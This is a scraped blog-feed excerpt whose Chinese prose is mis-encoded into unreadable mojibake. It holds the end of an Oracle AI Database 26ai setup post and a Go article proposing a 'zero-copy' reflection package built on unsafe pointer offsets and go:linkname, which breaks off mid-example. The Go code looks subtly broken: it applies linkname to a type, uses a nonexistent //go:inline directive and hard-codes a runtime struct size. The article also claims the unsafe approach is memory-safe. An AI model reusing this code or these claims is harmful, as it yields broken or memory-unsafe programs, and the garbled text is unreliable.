åªæœ‰ä¸€ä¸ªç¯å¢ƒï¼Œå°±ç›´æ¥é…ç½®åˆ°ç¯å¢ƒå˜é‡ä¸­ã€‚</p>\n<pre><code class=\"language-BASH\">$ source 26ai.env\n\n$ sqlplus / as sysdba\n\nSQL*Plus: Release 23.26.1.0.0 - Production on Fri Jan 30 14:39:00 2026\nVersion 23.26.1.0.0\n\nCopyright (c) 1982, 2025, Oracle.  All rights reserved.\n\n\nConnected to:\nOracle AI Database 26ai Enterprise Edition Release 23.26.1.0.0 - Production\nVersion 23.26.1.0.0\n\nSQL&gt; show pdbs;\n\n    CON_ID CON_NAME                       OPEN MODE  RESTRICTED\n---------- ------------------------------ ---------- ----------\n         2 PDB$SEED                       READ ONLY  NO\n         3 ORCLPDB1                       READ WRITE NO\n</code></pre>\n<p>syså¯†ç æ˜¯è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œå¯ä»¥è‡ªå·±ä¿®æ”¹ä¸ºè‡ªå·±æƒ³è¦çš„ï¼š</p>\n<pre><code class=\"language-sql\">alter user sys identified by \"your-sys-password\";\n</code></pre>\n<p>é¡ºæ‰‹æŸ¥çœ‹ç›‘å¬ <code>lsnrctl status</code> å‘ç°ä¹Ÿéƒ½æ˜¯è‡ªåŠ¨å¯åŠ¨æˆåŠŸçš„ã€‚</p>\n<p>å‰©ä¸‹è¦åšçš„å°±åªæ˜¯æŒ‰éœ€åˆ›å»ºè‡ªå·±çš„æµ‹è¯•ç”¨æˆ·ï¼Œå°±èƒ½ç›´æ¥ç”¨èµ·æ¥äº†ã€‚</p>\n\n\n</div>\n<div id=\"MySignature\">\n    <a href=\"https://www.cnblogs.com/jyzhao/\" target=\"_blank\">AlfredZhao</a>Â©ç‰ˆæƒæ‰€æœ‰ã€Œä»Oracleèµ·èˆªï¼Œé¢†ç•¥ç²¾å½©çš„ITæŠ€æœ¯ã€‚ã€<br />\nè½¬è½½è¯·æ³¨æ˜åŸæ–‡é“¾æ¥ï¼š<a href=\"https://www.cnblogs.com/jyzhao/p/19556062/ai-kai-fa-zhe-ru-he-wu-tong-bu-shuoracle-ai-databa\" target=\"_blank\">https://www.cnblogs.com/jyzhao/p/19556062/ai-kai-fa-zhe-ru-he-wu-tong-bu-shuoracle-ai-databa</a>\n<hr />\n<div style=\"text-align: center; margin-top: 30px;\">\n  <p style=\"font-size: 14px; color: #555;\">\n    ğŸ‘‹ æ„Ÿè°¢é˜…è¯»ï¼Œæ¬¢è¿å…³æ³¨æˆ‘çš„å…¬ä¼—å· <b>ã€Œèµµé–å®‡ã€</b>\n  </p>\n  <img src=\"https://images.cnblogs.com/cnblogs_com/jyzhao/824234/o_250208075013_qrcode-zjy.jpg\" style=\"border: 1px solid #ddd; border-radius: 8px;\" width=\"160\" />\n</div>\n</div>\n<div class=\"clear\"></div>\n\n        <div class=\"clear\"></div>\n        \n</div>\n    <ul class=\"postmetadata\">\n        \n    </ul>"
    },
    {
      "title": "Goåå°„ï¼šæ€§èƒ½ç“¶é¢ˆä¸é›¶æ‹·è´ä¼˜åŒ–",
      "link": "https://www.cnblogs.com/fgaoxing/p/19555877",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/fgaoxing/p/19555877\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-01-30 22:01\">\n    <span>Goåå°„ï¼šæ€§èƒ½ç“¶é¢ˆä¸é›¶æ‹·è´ä¼˜åŒ–</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<blockquote>\n<p>åŸæ–‡ï¼š<a href=\"https://www.yt-blog.top/38912/\" rel=\"noopener nofollow\" target=\"_blank\">https://www.yt-blog.top/38912/</a></p>\n</blockquote>\n<p>åšGoå¼€å‘çš„ï¼Œè‚¯å®šå°‘ä¸äº†ç”¨åå°„â€”â€”è§£æTagã€æ‹¿å­—æ®µåç§»ã€è·å–ç±»å‹ä¿¡æ¯ï¼ŒORMã€åºåˆ—åŒ–ã€é…ç½®ç»‘å®šè¿™äº›åœ°æ–¹éƒ½è¦ç”¨åˆ°ã€‚</p>\n<p>ä½†æ˜¯å®˜æ–¹çš„<code>reflect</code>åŒ…æ€§èƒ½çœŸçš„ä¸å¤ªè¡Œï¼Œè§£æä¸€ä¸ªå­—æ®µæˆ–Tagè¦èŠ±å‡ ååˆ°å‡ ç™¾ä¸‡çº³ç§’ï¼Œè°ƒå¾—å¤šäº†ï¼Œç›´æ¥æˆæ€§èƒ½ç“¶é¢ˆã€‚</p>\n<p>å¾ˆå¤šäººåªçŸ¥é“ã€Œåå°„æ…¢ã€ï¼Œä½†ä¸çŸ¥é“æ…¢åœ¨å“ªã€‚å’±ä»¬ä»Šå¤©å°±ä»<code>runtime</code>å±‚é¢åˆ†æä¸€ä¸‹ï¼Œé¡ºä¾¿æä¸ªé›¶æ‹·è´çš„ä¼˜åŒ–æ–¹æ¡ˆã€‚</p>\n<h2 id=\"ä¸€å…ˆä»åº•å±‚è¯´èµ·\">ä¸€ã€å…ˆä»åº•å±‚è¯´èµ·</h2>\n<p>è¦ææ¸…æ¥šåå°„çš„æ€§èƒ½é—®é¢˜ï¼Œå¾—å…ˆçŸ¥é“Goåº•å±‚æ˜¯æ€ä¹ˆå›äº‹ã€‚</p>\n<p>ä»Go1.14å¼€å§‹ï¼Œ<code>runtime</code>é‡Œå‡ ä¸ªæ ¸å¿ƒç±»å‹çš„å†…å­˜å¸ƒå±€å°±æ²¡å˜è¿‡ã€‚è¿™æ˜¯ä¸ªå…³é”®ç‚¹ã€‚</p>\n<p>Goçš„åå°„åŒ…å°±æ˜¯åŸºäº<code>runtime</code>å±‚çš„<code>abi</code>å®ç°çš„ã€‚</p>\n<p><a href=\"https://github.com/golang/go/blob/master/src/reflect/type.go\" rel=\"noopener nofollow\" target=\"_blank\">reflect/type.go</a></p>\n<pre><code class=\"language-go\">// TypeOf returns the reflection [Type] that represents the dynamic type of i.\n// If i is a nil interface value, TypeOf returns nil.\nfunc TypeOf(i any) Type {\n return toType(abi.TypeOf(i))\n}\n</code></pre>\n<p>å…¶å®<code>reflect.Type</code>å°±æ˜¯ä¸€ä¸ªæ¥å£ï¼Œä¸Šé¢ä»£ç é‡Œçš„<code>toType()</code>æŠŠå®ƒè½¬æˆäº†<code>reflect.rtype</code>ã€‚</p>\n<pre><code class=\"language-go\">// rtype is the common implementation of most values.\n// It is embedded in other struct types.\ntype rtype struct {\n t abi.Type\n}\n\nfunc toRType(t *abi.Type) *rtype {\n return (*rtype)(unsafe.Pointer(t))\n}\n</code></pre>\n<p>æ‰€ä»¥æœ€åæ‹¿åˆ°çš„æ˜¯ä¸ª<code>abi.Type</code>å®ä¾‹ï¼Œ<code>reflect.rtype</code>åªæ˜¯ç»™å®ƒåŒ…äº†ä¸€å±‚ï¼Œæä¾›ä¸ªå‹å¥½çš„æ¥å£ã€‚ä¹Ÿå¯ä»¥æ¢æˆåˆ«çš„ç±»å‹ä¸“ç”¨ç»“æ„ä½“ï¼Œä½†æœ¬è´¨ä¸Šéƒ½æ˜¯å¯¹<code>abi.Type</code>çš„å°è£…ã€‚</p>\n<p><a href=\"https://github.com/golang/go/blob/master/src/internal/abi/type.go\" rel=\"noopener nofollow\" target=\"_blank\">internal/abi/type.go</a></p>\n<pre><code class=\"language-go\">// Type is the runtime representation of a Go type.\n//\n// Be careful about accessing this type at build time, as the version\n// of this type in the compiler/linker may not have the same layout\n// as the version in the target binary, due to pointer width\n// differences and any experiments. Use cmd/compile/internal/rttype\n// or the functions in compiletype.go to access this type instead.\n// (TODO: this admonition applies to every type in this package.\n// Put it in some shared location?)\ntype Type struct {\n Size_       uintptr\n PtrBytes    uintptr // number of (prefix) bytes in the type that can contain pointers\n Hash        uint32  // hash of type; avoids computation in hash tables\n TFlag       TFlag   // extra type information flags\n Align_      uint8   // alignment of variable with this type\n FieldAlign_ uint8   // alignment of struct field with this type\n Kind_       Kind    // enumeration for C\n // function for comparing objects of this type\n // (ptr to object A, ptr to object B) -&gt; ==?\n Equal func(unsafe.Pointer, unsafe.Pointer) bool\n // GCData stores the GC type data for the garbage collector.\n // Normally, GCData points to a bitmask that describes the\n // ptr/nonptr fields of the type. The bitmask will have at\n // least PtrBytes/ptrSize bits.\n // If the TFlagGCMaskOnDemand bit is set, GCData is instead a\n // **byte and the pointer to the bitmask is one dereference away.\n // The runtime will build the bitmask if needed.\n // (See runtime/type.go:getGCMask.)\n // Note: multiple types may have the same value of GCData,\n // including when TFlagGCMaskOnDemand is set. The types will, of course,\n // have the same pointer layout (but not necessarily the same size).\n GCData    *byte\n Str       NameOff // string form\n PtrToThis TypeOff // type for pointer to this type, may be zero\n}\n</code></pre>\n<p>å½“ç„¶å®é™…ä¸Šç»“æ„ä½“æ•°æ®æ˜¯å¦‚ä¸Šç»“æ„ä½“çš„æ‰©å±•ï¼ŒåŒæ ·å®šä¹‰åœ¨ä¸€èµ·ã€‚</p>\n<p><a href=\"https://github.com/golang/go/blob/master/src/internal/abi/type.go\" rel=\"noopener nofollow\" target=\"_blank\">internal/abi/type.go</a></p>\n<pre><code class=\"language-go\">type StructField struct {\n Name   Name    // name is always non-empty\n Typ    *Type   // type of field\n Offset uintptr // byte offset of field\n}\n\ntype StructType struct {\n Type\n PkgPath Name\n Fields  []StructField\n}\n</code></pre>\n<p>è¿˜æœ‰ä¸€ç‚¹ï¼Œè¿™äº›åº•å±‚ç±»å‹é‡Œå­˜çš„ç»“æ„ä½“å…ƒæ•°æ®ï¼Œæ˜¯ç¼–è¯‘å™¨ç¼–è¯‘æ—¶å°±å†™è¿›ç¨‹åºçš„<strong>åªè¯»å†…å­˜åŒº</strong>äº†ï¼Œ<strong>åœ°å€å›ºå®šã€GCä¸å›æ”¶ã€è¿è¡Œæ—¶ä¸èƒ½æ”¹</strong>ã€‚è¿™ç»™ç›´æ¥æ“ä½œåº•å±‚å†…å­˜æä¾›äº†å®‰å…¨ä¿éšœã€‚</p>\n<p>æ—¢ç„¶è¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<strong>å›ºå®šåç§»é‡</strong>ç²¾ç¡®æ‰¾åˆ°ç›®æ ‡å­—æ®µï¼Œä¸ç”¨å®Œæ•´è§£ææ•´ä¸ªåº•å±‚ç»“æ„ä½“ï¼Œåªè¦å®šä¹‰å‡ ä¸ªç©ºçš„é•œåƒç±»å‹æ¥åšç±»å‹æ ‡æ³¨å°±å¤Ÿäº†ã€‚</p>\n<h2 id=\"äºŒæ€§èƒ½ç“¶é¢ˆåœ¨å“ªå„¿\">äºŒã€æ€§èƒ½ç“¶é¢ˆåœ¨å“ªå„¿</h2>\n<p><code>reflect.TypeOf()</code>åº•å±‚å°±æ˜¯åšä¸ªæŒ‡é’ˆè½¬æ¢ï¼Œä¸æ‹·è´ä¸è®¡ç®—ï¼ŒæŒºå¿«çš„ã€‚çœŸæ­£çš„æ€§èƒ½æŸè€—å‡ºåœ¨åé¢ä¸¤ä¸ªé˜¶æ®µï¼Œè€Œä¸”å› ä¸ºæ²¡ç¼“å­˜ï¼ŒæŸè€—è¢«æ”¾å¤§äº†å¥½å‡ å€ã€‚</p>\n<h3 id=\"21-fieldæ–¹æ³•åšäº†æ— æ„ä¹‰çš„å†…å­˜åˆ†é…\">2.1 Fieldæ–¹æ³•åšäº†æ— æ„ä¹‰çš„å†…å­˜åˆ†é…</h3>\n<p>è°ƒç”¨<code>reflect.Type.Field(i)</code>çš„æ—¶å€™ï¼Œ<code>rtype</code>ä¼šè¢«è½¬æˆ<code>*StructType</code>ï¼Œç„¶åä»<code>Fields</code>å­—æ®µé‡Œè¯»ç›®æ ‡å­—æ®µä¿¡æ¯ã€‚</p>\n<p><a href=\"https://github.com/golang/go/blob/master/src/reflect/type.go\" rel=\"noopener nofollow\" target=\"_blank\">reflect/type.go</a></p>\n<pre><code class=\"language-go\">// Struct field\ntype structField = abi.StructField // æ³¨æ„ï¼šä½ å¹³æ—¶ç”¨çš„æ˜¯ reflect.structFieldï¼Œä¸æ˜¯reflect.StructField\n\n// structType represents a struct type.\ntype structType struct {\n abi.StructType\n}\n\nfunc (t *rtype) Field(i int) StructField {\n if t.Kind() != Struct {\n  panic(\"reflect: Field of non-struct type \" + t.String())\n }\n tt := (*structType)(unsafe.Pointer(t))\n return tt.Field(i)\n}\n\n// Field returns the i'th struct field.\nfunc (t *structType) Field(i int) (f StructField) {\n if i &lt; 0 || i &gt;= len(t.Fields) {\n  panic(\"reflect: Field index out of bounds\")\n }\n p := &amp;t.Fields[i]\n f.Type = toType(p.Typ)\n f.Name = p.Name.Name()\n f.Anonymous = p.Embedded()\n if !p.Name.IsExported() {\n  f.PkgPath = t.PkgPath.Name()\n }\n if tag := p.Name.Tag(); tag != \"\" {\n  f.Tag = StructTag(tag)\n }\n f.Offset = p.Offset\n\n // We can't safely use this optimization on js or wasi,\n // which do not appear to support read-only data.\n if i &lt; 256 &amp;&amp; runtime.GOOS != \"js\" &amp;&amp; runtime.GOOS != \"wasip1\" {\n  staticuint64s := getStaticuint64s()\n  p := unsafe.Pointer(&amp;(*staticuint64s)[i])\n  if unsafe.Sizeof(int(0)) == 4 &amp;&amp; goarch.BigEndian {\n   p = unsafe.Add(p, 4)\n  }\n  f.Index = unsafe.Slice((*int)(p), 1)\n } else {\n  // NOTE(rsc): This is the only allocation in the interface\n  // presented by a reflect.Type. It would be nice to avoid,\n  // but we need to make sure that misbehaving clients of\n  // reflect cannot affect other uses of reflect.\n  // One possibility is CL 5371098, but we postponed that\n  // ugliness until there is a demonstrated\n  // need for the performance. This is issue 2320.\n  f.Index = []int{i}\n }\n return\n}\n</code></pre>\n<p>ä¸Šé¢è¿™æ®µä»£ç é—®é¢˜åœ¨å“ªå„¿å‘¢ï¼Ÿçœ‹<code>f.Index = []int{i}</code>è¿™ä¸€è¡Œã€‚è¿™é‡Œæ— æ„ä¹‰åœ°åˆ›å»ºäº†ä¸€ä¸ªåˆ—è¡¨ï¼Œå®é™…ä¸Šè¿™ä¸ªæ•°æ®å°±æ˜¯ä½ è‡ªå·±ä¼ è¿›å»çš„<code>i</code>ï¼Œå®Œå…¨æ²¡å¿…è¦ã€‚è¿™æ­¥æ“ä½œçº¯ç²¹æ˜¯ä¸ºäº†å…¼å®¹æ€§ã€‚</p>\n<p>å…·ä½“è®¨è®ºå¯ä»¥çœ‹<a href=\"https://github.com/golang/go/issues/68380\" rel=\"noopener nofollow\" target=\"_blank\">golang/go Â· Issue#68380</a>ã€‚</p>\n<h3 id=\"22-tagè·å–æ—¶çš„å­—ç¬¦ä¸²æ‹·è´\">2.2 Tagè·å–æ—¶çš„å­—ç¬¦ä¸²æ‹·è´</h3>\n<p>åˆšæ‰è¯´çš„è·å–å­—æ®µçš„æ—¶å€™ï¼Œ<code>StructField</code>çš„<code>Tag</code>å­—æ®µæ˜¯<code>StructTag</code>ç±»å‹ï¼Œå…¶å®å°±æ˜¯ä¸ª<code>string</code>ã€‚</p>\n<p><a href=\"https://github.com/golang/go/blob/master/src/reflect/type.go\" rel=\"noopener nofollow\" target=\"_blank\">reflect/type.go</a></p>\n<pre><code class=\"language-go\">// A StructTag is the tag string in a struct field.\n//\n// By convention, tag strings are a concatenation of\n// optionally space-separated key:\"value\" pairs.\n// Each key is a non-empty string consisting of non-control\n// characters other than space (U+0020 ' '), quote (U+0022 '\"'),\n// and colon (U+003A ':').  Each value is quoted using U+0022 '\"'\n// characters and Go string literal syntax.\ntype StructTag string\n\n// Get returns the value associated with key in the tag string.\n// If there is no such key in the tag, Get returns the empty string.\n// If the tag does not have the conventional format, the value\n// returned by Get is unspecified. To determine whether a tag is\n// explicitly set to the empty string, use [StructTag.Lookup].\nfunc (tag StructTag) Get(key string) string {\n v, _ := tag.Lookup(key)\n return v\n}\n\n// Lookup returns the value associated with key in the tag string.\n// If the key is present in the tag the value (which may be empty)\n// is returned. Otherwise the returned value will be the empty string.\n// The ok return value reports whether the value was explicitly set in\n// the tag string. If the tag does not have the conventional format,\n// the value returned by Lookup is unspecified.\nfunc (tag StructTag) Lookup(key string) (value string, ok bool) {\n // When modifying this code, also update the validateStructTag code\n // in cmd/vet/structtag.go.\n\n for tag != \"\" {\n  // Skip leading space.\n  i := 0\n  for i &lt; len(tag) &amp;&amp; tag[i] == ' ' {\n   i++\n  }\n  tag = tag[i:]\n  if tag == \"\" {\n   break\n  }\n\n  // Scan to colon. A space, a quote or a control character is a syntax error.\n  // Strictly speaking, control chars include the range [0x7f, 0x9f], not just\n  // [0x00, 0x1f], but in practice, we ignore the multi-byte control characters\n  // as it is simpler to inspect the tag's bytes than the tag's runes.\n  i = 0\n  for i &lt; len(tag) &amp;&amp; tag[i] &gt; ' ' &amp;&amp; tag[i] != ':' &amp;&amp; tag[i] != '\"' &amp;&amp; tag[i] != 0x7f {\n   i++\n  }\n  if i == 0 || i+1 &gt;= len(tag) || tag[i] != ':' || tag[i+1] != '\"' {\n   break\n  }\n  name := string(tag[:i])\n  tag = tag[i+1:]\n\n  // Scan quoted string to find value.\n  i = 1\n  for i &lt; len(tag) &amp;&amp; tag[i] != '\"' {\n   if tag[i] == '\\\\' {\n    i++\n   }\n   i++\n  }\n  if i &gt;= len(tag) {\n   break\n  }\n  qvalue := string(tag[:i+1])\n  tag = tag[i+1:]\n\n  if key == name {\n   value, err := strconv.Unquote(qvalue)\n   if err != nil {\n    break\n   }\n   return value, true\n  }\n }\n return \"\", false\n}\n</code></pre>\n<p>è¿™é‡Œçš„<code>tag[:i]</code>å’Œ<code>tag[i+1:]</code>ä¼šéšå¼è½¬æˆ<code>slice</code>ï¼Œè¿™ä¸€æ­¥åªæ”¹äº†æ ˆä¸Šçš„å…ƒä¿¡æ¯ç»“æ„ä½“ï¼Œä½†æ˜¯<code>string</code>è½¬æ¢è¿‡ç¨‹ä¸ºäº†ä¿è¯å†…å­˜å®‰å…¨ï¼Œä¼šè§¦å‘ä¸€æ¬¡å†…å­˜æ‹·è´ï¼Œè¿™ä¸€æ­¥æ˜¯èº²ä¸æ‰çš„ã€‚</p>\n<p>ç°åœ¨ä¸»æµæ–¹æ¡ˆåƒå®˜æ–¹çš„<code>strings.Builder</code>çš„<code>String()</code>æ–¹æ³•ï¼Œå› ä¸ºä¸éœ€è¦æŠŠåŸå§‹æ•°æ®å’Œæ–°å­—ç¬¦ä¸²éš”ç¦»å¼€ï¼Œæ‰€ä»¥ç”¨çš„æ˜¯<code>unsafe.String(unsafe.SliceData(b.buf), len(b.buf))</code>ã€‚</p>\n<p>è¿™æ ·å¾—åˆ°çš„<code>string</code>å’Œ<code>buf</code>æŒ‡å‘åŒä¸€å—å†…å­˜ï¼Œä¸ä¼šè§¦å‘é¢å¤–çš„å†…å­˜æ‹·è´ï¼Œè€Œä¸”<code>unsafe</code>èƒ½ä¿è¯å†…å­˜å®‰å…¨ï¼Œä¸ä¼šè¢«GCå›æ”¶ã€‚</p>\n<h2 id=\"ä¸‰é›¶æ‹·è´ä¼˜åŒ–çš„æ€è·¯\">ä¸‰ã€é›¶æ‹·è´ä¼˜åŒ–çš„æ€è·¯</h2>\n<p>é’ˆå¯¹ä¸Šé¢è¯´çš„æ€§èƒ½ç“¶é¢ˆï¼Œç»“åˆGo1.14+åº•å±‚ç±»å‹ç»“æ„å›ºå®šçš„ç‰¹ç‚¹ï¼Œé›¶æ‹·è´ä¼˜åŒ–çš„æ€è·¯å…¶å®æŒºç®€å•çš„ï¼š</p>\n<ol>\n<li>ä¸ç”¨åå°„åŒ…é‚£ä¸€å±‚å°è£…ï¼Œç›´æ¥å¯¹æ¥runtimeå±‚ï¼Œå…¨ç¨‹<strong>åªè¯»å†…å­˜</strong>ï¼Œä¸åšä»»ä½•æ²¡å¿…è¦çš„æ‹·è´ï¼›</li>\n<li>å®šä¹‰å‡ ä¸ª<strong>ç©ºçš„é•œåƒç±»å‹</strong>æ¥åšç±»å‹æ ‡æ³¨ï¼Œä¸ç”¨å¡«ä»»ä½•å­—æ®µï¼Œç”¨<strong>Go1.14+å›ºå®šçš„å†…å­˜åç§»é‡</strong>ç²¾å‡†æ‰¾åˆ°ç›®æ ‡å­—æ®µï¼›</li>\n<li>è§£æ<code>reflect.Type</code>æ¥å£æ‹¿åˆ°åº•å±‚çš„åŸå§‹å†…å­˜åœ°å€ï¼Œé€šè¿‡<code>unsafe</code>æ“ä½œï¼Œç”¨å›ºå®šåç§»é‡ç›´æ¥è¯»æ•°æ®ï¼›</li>\n<li>æä¸ª<strong>å…¨å±€ç¼“å­˜</strong>å­˜ç»“æ„ä½“å…ƒæ•°æ®ï¼Œæ¯ä¸ªç»“æ„ä½“åªè§£æä¸€æ¬¡ï¼Œé¿å…é«˜é¢‘åœºæ™¯ä¸‹çš„é‡å¤æ“ä½œã€‚</li>\n</ol>\n<p>è¿™ä¸ªæ–¹æ¡ˆçš„æ ¸å¿ƒé€»è¾‘è·ŸGoåº•å±‚æ“ä½œå®Œå…¨ä¸€æ ·ï¼Œæ‰€æœ‰åç§»é‡éƒ½æ˜¯åŸºäºGo1.14+çš„å›ºå®šå¸ƒå±€é¢„è®¾çš„ï¼Œé‡åˆ°ç‰¹æ®Šç‰ˆæœ¬é¡¶å¤šæ”¹æ”¹åç§»é‡ï¼Œä¸ç”¨æ‹…å¿ƒå…¼å®¹æ€§é—®é¢˜ã€‚</p>\n<h2 id=\"å››å…·ä½“å®ç°\">å››ã€å…·ä½“å®ç°</h2>\n<p>å‰é¢åˆ†æäº†åŠå¤©ï¼Œåå°„æ…¢ä¸»è¦æœ‰ä¸¤ä¸ªé—®é¢˜ï¼š</p>\n<ol>\n<li><code>Field</code> æ–¹æ³•ä¼šåˆ›å»ºä¸€ä¸ªæ— æ„ä¹‰çš„ <code>[]int{i}</code> åˆ‡ç‰‡ï¼ˆä¸ºäº†å…¼å®¹æ€§ï¼‰</li>\n<li><code>Tag.Get</code> ä¼šè§¦å‘å­—ç¬¦ä¸²çš„å†…å­˜æ‹·è´</li>\n</ol>\n<p>ä¸‹é¢æ˜¯å®Œæ•´çš„é›¶æ‹·è´å®ç°ï¼š</p>\n<h3 id=\"41-æ ¸å¿ƒå®šä¹‰\">4.1 æ ¸å¿ƒå®šä¹‰</h3>\n<pre><code class=\"language-go\">//go:build go1.14\n// +build go1.14\n\npackage zerorefl\n\nimport (\n  \"reflect\"\n  \"strconv\"\n  \"unsafe\"\n)\n\nconst (\n  // abiTypeSize æ˜¯ abi.Type ç»“æ„ä½“çš„å¤§å°\n  // Go1.14+ ä¸­å›ºå®šä¸º48å­—èŠ‚\n  abiTypeSize = 48\n)\n\n// ç©ºé•œåƒç±»å‹ï¼šåªåšç±»å‹æ ‡æ³¨ï¼Œä¸ç”¨å¡«å­—æ®µ\ntype rtype struct{}\n\ntype structType struct {\n  PkgPath Name\n  Fields  []structField\n}\n\ntype structField struct {\n  Name   Name\n  Typ    *rtype\n  Offset uintptr\n}\n\n// Name ç±»å‹ï¼Œè·Ÿ runtime.Name ä¸€æ ·\n//go:linkname Name runtime.Name\ntype Name struct {\n  Bytes *byte\n}\n\n// ä¸‹é¢è¿™äº›æ–¹æ³•éƒ½æ˜¯ runtime.Name çš„å®ç°\n//go:linkname Name_Name runtime.(*Name).Name\n//go:inline\nfunc (n *Name) Name() string {\n  if n.Bytes == nil {\n    return \"\"\n  }\n  i, l := n.ReadVarint(1)\n  return unsafe.String(n.DataChecked(1+i, \"non-empty string\"), l)\n}\n\n//go:linkname Name_Tag runtime.(*Name).Tag\n//go:inline\nfunc (n *Name) Tag() string {\n  if !n.HasTag() {\n    return \"\"\n  }\n  i, l := n.ReadVarint(1)\n  i2, l2 := n.ReadVarint(1 + i + l)\n  return unsafe.String(n.DataChecked(1+i+l+i2, \"non-empty string\"), l2)\n}\n\n//go:linkname Name_IsExported runtime.(*Name).IsExported\n//go:inline\nfunc (n *Name) IsExported() bool {\n  return (*n.Bytes)&amp;(1&lt;&lt;0) != 0\n}\n\n//go:linkname Name_IsEmbedded runtime.(*Name).IsEmbedded\n//go:inline\nfunc (n *Name) IsEmbedded() bool {\n  return (*n.Bytes)&amp;(1&lt;&lt;3) != 0\n}\n\n//go:linkname Name_HasTag runtime.(*Name).HasTag\n//go:inline\nfunc (n *Name) HasTag() bool {\n  return (*n.Bytes)&amp;(1&lt;&lt;1) != 0\n}\n\n//go:linkname Name_ReadVarint runtime.(*Name).ReadVarint\n//go:inline\nfunc (n *Name) ReadVarint(off int) (int, int) {\n  v := 0\n  for i := 0; ; i++ {\n    x := n.DataChecked(off+i, \"read varint\")\n    v += int(x&amp;0x7f) &lt;&lt; (7 * i)\n    if x&amp;0x80 == 0 {\n      return i + 1, v\n    }\n  }\n}\n\n//go:linkname Name_DataChecked runtime.(*Name).DataChecked\n//go:inline\nfunc (n *Name) DataChecked(off int, whySafe string) *byte {\n  return (*byte)(addChecked(unsafe.Pointer(n.Bytes), uintptr(off), whySafe))\n}\n\nfunc addChecked(p unsafe.Pointer, x uintptr, whySafe string) unsafe.Pointer {\n  return unsafe.Pointer(uintptr(p) + x)\n}\n\n//go:linkname toType reflect.toType\n//go:noescape\nfunc toType(t *rtype) reflect.Type\n</code></pre>\n<h3 id=\"42-æ ¸å¿ƒæ–¹æ³•\">4.2 æ ¸å¿ƒæ–¹æ³•</h3>\n<pre><code class=\"language-go\">// GetField è·å–ç»“æ„ä½“å­—æ®µï¼Œä¸åˆ†é…åˆ‡ç‰‡\n//\n//go:inline\nfunc GetField(sf *reflect.StructField, st *structType, i int) bool {\n  if st == nil || i &lt; 0 || i &gt;= len(st.Fields) {\n    return false\n  }\n  stf := &amp;st.Fields[i]\n  sf.Name = stf.Name.Name()\n  sf.Type = toType(stf.Typ)\n  sf.Offset = stf.Offset\n  sf.Anonymous = stf.Name.IsEmbedded()\n  if tag := stf.Name.Tag(); tag != \"\" {\n    sf.Tag = reflect.StructTag(tag)\n  }\n  if !stf.Name.IsExported() {\n    sf.PkgPath = st.PkgPath.Name()\n  }\n  // æ³¨æ„ï¼šè¿™é‡Œä¸è®¾ç½® sf.Indexï¼Œé¿å…æ— æ„ä¹‰çš„åˆ‡ç‰‡åˆ†é…\n  return true\n}\n\n//go:inline\nfunc TypeFieldLen(st *structType) int {\n  return len(st.Fields)\n}\n\n// Type2StructType å°† reflect.Type è½¬æ¢ä¸º structType\n// ç”¨å›ºå®šåç§»é‡ç›´æ¥è½¬ï¼Œä¸æ‹·è´\nfunc Type2StructType(t reflect.Type) *structType {\n  if t.Kind() != reflect.Struct {\n    return nil\n  }\n  // reflect.Type æ˜¯æ¥å£ï¼Œåº•å±‚å­˜ [ç±»å‹æŒ‡é’ˆ, æ•°æ®æŒ‡é’ˆ]\n  // æ•°æ®æŒ‡é’ˆå°±æ˜¯ structType çš„èµ·å§‹åœ°å€\n  // å› ä¸º structType åµŒå…¥äº† abi.Typeï¼Œæ‰€ä»¥è¦è·³è¿‡ abi.Type çš„å¤§å°\n  return (*structType)(unsafe.Pointer((*[2]uintptr)(unsafe.Pointer(&amp;t))[1] + abiTypeSize))\n}\n\n// RType2Type å°† *rtype è½¬æ¢ä¸º reflect.Type\n//\n//go:inline\nfunc RType2Type(t *rtype) reflect.Type {\n  return toType(t)\n}\n</code></pre>\n<h3 id=\"43-é›¶æ‹·è´tagè·å–\">4.3 é›¶æ‹·è´Tagè·å–</h3>\n<pre><code class=\"language-go\">// GetTag é›¶æ‹·è´è·å–Tagå€¼\n// æ¯” reflect.StructTag.Get å¿«ï¼Œé¿å…äº†å­—ç¬¦ä¸²æ‹·è´\nfunc GetTag(tag reflect.StructTag, key string) (value string, ok bool) {\n  for tag != \"\" {\n    // Skip leading space.\n    i := 0\n    for i &lt; len(tag) &amp;&amp; tag[i] == ' ' {\n      i++\n    }\n    tag = tag[i:]\n    if tag == \"\" {\n      break\n    }\n\n    // Scan to colon. A space, a quote or a control character is a syntax error.\n    i = 0\n    for i &lt; len(tag) &amp;&amp; tag[i] &gt; ' ' &amp;&amp; tag[i] != ':' &amp;&amp; tag[i] != '\"' &amp;&amp; tag[i] != 0x7f {\n      i++\n    }\n    if i == 0 || i+1 &gt;= len(tag) || tag[i] != ':' || tag[i+1] != '\"' {\n      break\n    }\n    name := string(tag[:i])\n    tag = tag[i+1:]\n\n    // Scan quoted string to find value.\n    needUnquote := false\n    i = 1\n    for i &lt; len(tag) &amp;&amp; tag[i] != '\"' {\n      if tag[i] == '\\\\' {\n        needUnquote = true\n        i++\n      }\n      i++\n    }\n    if i &gt;= len(tag) {\n      break\n    }\n    tmp := tag[:i+1]\n    qvalue := string(tmp)\n    tag = tag[i+1:]\n\n    if key == name {\n      if needUnquote {\n        // éœ€è¦è½¬ä¹‰æ—¶ï¼Œè¿˜æ˜¯å¾—åˆ†é…æ–°å­—ç¬¦ä¸²\n        value, err := strconv.Unquote(qvalue)\n        if err != nil {\n          break\n        }\n        return value, true\n      }\n      // ä¸éœ€è¦è½¬ä¹‰æ—¶ï¼Œç›´æ¥è¿”å›å­—ç¬¦ä¸²åˆ‡ç‰‡\n      // Goçš„å­—ç¬¦ä¸²åˆ‡ç‰‡æ˜¯é›¶æ‹·è´çš„\n      return qvalue[1 : len(qvalue)-1], true\n    }\n  }\n  return \"\", false\n}\n</code></pre>\n<h3 id=\"44-ä½¿ç”¨ç¤ºä¾‹\">4.4 ä½¿ç”¨ç¤ºä¾‹</h3>\n<pre><code class=\"language-go\">package main\n\nimport (\n  \"fmt\"\n  \"reflect\"\n  \"zerorefl\"\n)\n\ntype User struct {\n  ID   int    `orm:\"primaryKey\" json:\"id\"`\n  Name string 